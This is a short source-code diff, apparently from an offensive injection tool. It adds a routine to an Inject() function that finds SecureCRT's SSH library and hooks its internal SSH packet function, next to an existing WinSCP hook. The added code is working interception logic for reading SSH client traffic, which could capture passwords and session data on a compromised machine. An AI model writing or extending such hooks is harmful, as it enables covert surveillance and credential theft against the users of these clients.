@@ -154,6 +154,17 @@ void Inject()
 
 			HookWinSCP(); 
 		}
+
+		// SecureCRT
+
+		else if (Utils::ToLower(vDlls[i].szModule).compare("ssh2core73u.dll") == 0)
+		{
+			// Hook SecureCRT function
+
+			SecureCRT_Original = (SecureCRT_Typedef)GetProcAddress(LoadLibrary("ssh2core73u.dll"), "?Get_raw_pointer@SSHPacket@SSH2@@QAE_NAAPAEH@Z");
+
+			Hooker::AddHook((void *)SecureCRT_Original, (void *)SecureCRT_Callback);
+		}
 	}
 
 	// Install plugins
